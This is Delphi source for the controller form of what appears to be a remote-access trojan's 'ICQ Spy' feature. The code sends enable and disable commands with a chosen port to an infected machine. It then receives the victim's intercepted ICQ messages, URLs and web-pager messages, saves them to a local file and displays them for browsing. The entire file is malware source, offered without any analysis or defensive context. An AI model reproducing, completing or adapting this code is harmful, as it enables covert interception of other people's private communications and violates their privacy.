unit ICQSpyUnit;

interface

uses
  Windows, Messages, SysUtils, Classes, Graphics, Controls, Forms, Dialogs,
  ExtCtrls, StdCtrls, TB97Ctls, ImgList, ScktComp;

type
  TICQSpyForm = class(TForm)
    GroupBox1: TGroupBox;
    Label1: TLabel;
    Label2: TLabel;
    Label3: TLabel;
    Label4: TLabel;
    Label5: TLabel;
    Label6: TLabel;
    Bevel1: TBevel;
    Bevel2: TBevel;
    Memo1: TMemo;
    Button1: TButton;
    Button2: TButton;
    Button3: TButton;
    Button4: TButton;
    ImageList1: TImageList;
    Bevel3: TBevel;
    Simbol: TToolbarButton97;
    ICQSpySocket: TClientSocket;
    hBox: TMemo;
    Label7: TLabel;
    procedure Button3Click(Sender: TObject);
    procedure Button2Click(Sender: TObject);
    procedure Button4Click(Sender: TObject);
    procedure ICQSpySocketRead(Sender: TObject; Socket: TCustomWinSocket);
    procedure Button1Click(Sender: TObject);
    procedure FormCreate(Sender: TObject);
  private
    procedure AddToMemo(FileName: String);
    procedure UpDateICQSpy;
    { Private declarations }
  public
    { Public declarations }
  end;

const receiving:Boolean=False;  
var
  ICQSpyForm: TICQSpyForm;

implementation

uses Unit2;

{$R *.DFM}

type _Message=record
      cod:String[3];
      info:array [1..2] of string[50];
      mesaj:String;
     end;
var Msg:array of _Message;
    TotalMsgs:Integer;
    Current:Integer;

procedure TICQSpyForm.Button3Click(Sender: TObject);
begin
 Hide;
end;

procedure TICQSpyForm.Button2Click(Sender: TObject);
begin
 inc(Current);
 UpDateICQSpy;
end;

procedure TICQSpyForm.Button4Click(Sender: TObject);
var t:string;
begin
if button4.caption='enable' then begin
 t:='7992';
 If not
 InputQuery('pick a port', 'enter any port #:', T) then exit;
 Form1.Status.Caption:='trying to enable ICQ Spy© on port '+t+'...';
 Form1.ClientSocket.Socket.SendText('EIS'+t);
 ICQSpySocket.Port:=StrToInt(t);
end;
if button4.caption='disable' then begin
 Hide;
 Form1.Status.Caption:='trying to disable ICQ spy...';
 Form1.ClientSocket.Socket.SendText('DIS');
 ICQSpySocket.Active:=False;
 ICQSpyForm.button4.caption:='enable';
end;
end;

procedure TICQSpyForm.UpDateICQSpy;
begin
 if Current=1 then button1.enabled:=false else button1.enabled:=true;
 if Current=TotalMsgs then button2.enabled:=false else button2.enabled:=true;
 label7.caption:='[total messages: '+inttostr(TotalMsgs)+'] - [current message: '+inttostr(Current)+']';
 memo1.lines.clear;
 if Msg[Current].cod='MSG' then
  begin
   Simbol.ImageIndex:=0;
   label2.caption:=msg[Current].info[1];
   label5.caption:=msg[Current].info[2];
   memo1.lines.text:=Msg[Current].Mesaj;
  end else
 if Msg[Current].cod='URL' then
  begin
   Simbol.ImageIndex:=1;
   label2.caption:=msg[Current].info[1];
   label5.caption:=msg[Current].info[2];
   memo1.lines.text:=Msg[Current].Mesaj;
  end else
 if Msg[Current].cod='WWP' then
  begin
   Simbol.ImageIndex:=2;
   label2.caption:='n/a';
   label5.caption:='n/a';
   memo1.lines.text:=Msg[Current].Mesaj;
  end;
{button3.caption:=msg[Current].cod;}
end;

procedure TICQSpyForm.AddToMemo(FileName:String);
var f:TextFile;
    i,loop:integer;
    s:string;
begin
 TotalMsgs:=TotalMsgs+1;
 AssignFile(f,FileName);
 Reset(f);
 try
 ReadLn(f,s);Msg[TotalMsgs].cod:=s;
 ReadLn(f,s);Msg[TotalMsgs].info[1]:=s;
 ReadLn(f,s);Msg[TotalMsgs].info[2]:=s;
 memo1.lines.clear;
 while not eof(f) do
  begin
   ReadLn(f,s);
   memo1.lines.add(s);
  end;
 Msg[TotalMsgs].mesaj:=memo1.lines.text;
 except;
 end;
 CloseFile(f);
 Current:=TotalMsgs;
 ICQSpyForm.Show;
 UpDateICQSpy;
end;

procedure TICQSpyForm.ICQSpySocketRead(Sender: TObject;
  Socket: TCustomWinSocket);
var Stream:TMemoryStream;
    nReceived,totalrecv,total,no,i: Integer;
    undesalveaza,StrIn,totalbytes:String;
    evreuna:boolean;
begin
  if receiving then exit;
  if form1.dir.text='<default>' then undesalveaza:='' else undesalveaza:=form1.dir.text+'\';
  Socket.ReceiveBuf (Buffer, 5);
  strIn := Copy (Buffer, 1, 5);
  evreuna:=false;
  if copy(strin,1,3)='ICQ' then evreuna:=true;
  if not evreuna then exit;
  receiving:=true;
  try no:=StrToInt(copy(strIN,4,2)); except end;
  totalbytes:='';
 try for i:=1 to no do
   begin
    Socket.ReceiveBuf (Buffer, 1);
    strIn := Copy (Buffer, 1, 1);
    totalbytes:=totalbytes+strIN;
   end;
   except
   end;
  total:=StrToInt(totalbytes);
 Stream := TMemoryStream.Create;
 totalrecv:=0;
 try
  while (totalrecv<total) do begin
   Application.ProcessMessages;
   nReceived := Socket.ReceiveBuf (Buffer, sizeof (Buffer));
   if nReceived>0 then
   begin
    Stream.Write (Buffer, nReceived);
    totalrecv:=totalrecv+nreceived;
   end;
  end;
  Stream.Position := 0;
  if FileExists(undesalveaza+'ICQSpy.txt') then try DeleteFile(undesalveaza+'ICQSpy.txt');except end;
  Stream.SaveToFile(undesalveaza+'ICQSpy.txt');
  AddToMemo(undesalveaza+'ICQSpy.txt');
 finally
  Stream.Free;
  receiving:=false;
 end;
end;

procedure TICQSpyForm.Button1Click(Sender: TObject);
begin
 dec(Current);
 UpDateICQSpy;
end;

procedure TICQSpyForm.FormCreate(Sender: TObject);
begin
 SetLength(Msg,250);
 TotalMsgs:=0;
 Current:=0;
end;

end.
